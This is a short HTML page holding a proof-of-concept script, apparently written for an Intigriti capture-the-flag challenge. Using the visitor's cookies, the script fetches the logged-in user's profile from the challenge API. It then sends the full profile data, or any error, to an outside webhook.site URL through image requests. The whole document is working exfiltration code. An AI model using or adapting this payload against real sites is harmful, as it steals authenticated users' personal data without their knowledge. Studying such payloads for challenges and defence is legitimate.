<!DOCTYPE html>
<html>
<body>
<script>
/*
  Diagnostic PoC
  Purpose: read current user profile (name / nickname)
*/

const WEBHOOK = "https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840";

(async () => {
  try {
    const res = await fetch(
      "https://challenge-0126.intigriti.io/api/me",
      { credentials: "include" }
    );

    const data = await res.json();

    // Send entire profile object for inspection
    new Image().src =
      WEBHOOK +
      "?stage=me_dump&data=" +
      encodeURIComponent(JSON.stringify(data));

  } catch (e) {
    new Image().src =
      WEBHOOK +
      "?stage=error&msg=" +
      encodeURIComponent(e.toString());
  }
})();
</script>
</body>
</html>
